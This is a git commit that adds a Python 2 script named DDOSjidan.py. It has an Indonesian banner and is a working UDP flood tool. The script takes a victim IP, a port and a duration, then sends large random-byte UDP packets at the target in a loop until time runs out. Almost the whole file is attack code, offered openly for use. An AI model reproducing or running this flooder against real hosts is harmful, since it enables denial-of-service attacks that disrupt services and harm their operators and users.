a09b51feaf316eb4e51489bafc57032227113511
CALONCODER45 <54286566+CALONCODER45@users.noreply.github.com>
2019-08-20 05:26:19 +0700

    Add files via upload

---
+++ DDOSjidan.py
@@ -0,0 +1,53 @@
+import time
+import socket
+import random
+import sys
+def usage():
+    print "\033[1;32m###############_______INGATLAH KEPADA ORANG TUA_______############"
+ 
+    
+       
+    print "#------------------------[\033[1;91mGUNAKAN DENAGN BIJAK\033[1;32m]--------------------#"
+    print "#-------------------------------------------------------#"
+    print "#   \033[1;91mCommand: " "python2 DDOSJIDAN.py " "<ip> <port> <packet> \033[1;32m   #"
+    print "#                                                       #"
+    print "#\033[1;91mCreator:KeepAlive  \033[1;32m##      ###       ##                #"
+    print "#\033[1;91mTeam   : ISL        \033[1;32m##     #          ##                #"
+    print "#\033[1;91mVersion:1.0        \033[1;32m##      ###       ##                #"
+    print "#                   ## \033[1;91m ##     \033[1;32m#  \033[1;91m##  \033[1;32m##                #"
+    print "#                   ##  \033[1;91m##  \033[1;32m###   \033[1;91m##  \033[1;32m######            #"
+    print "#               \033[1;91m<--[SCURITI BAKALAN INDONESIA]-->         \033[1;32m#"
+    print "#########################################################"
+    print "                        @@@@@@@@@@"
+    print "                       @@@@@@@@@@@@"
+    print "                     @@@@@@@@@@@@@@@@"
+    print "JIKA KITA SKOLAH TANPA ADANYA SERING PRAKTEK->TEKUN->TLATEN!!! MAKA G USAH SEKOLAH MAIN GAME AJA SANA."
+    
+    
+    print "KASIAN ORANG TUA MENCARI UANG DEMI MENYEKOLAHKANMU"
+def flood(victim, vport, duration):
+    # Support us yaakk... :)
+    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # 20000 representasi satu byte ke server
+    bytes = random._urandom(20000)
+    timeout =  time.time() + duration
+    sent = 3000
+
+    while 1:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        client.sendto(bytes, (victim, vport))
+        sent = sent + 1
+        print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
+def main():
+    print len(sys.argv)
+    if len(sys.argv) != 4:
+        usage()
+    else:
+        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+
+if __name__ == '__main__':
+    main()
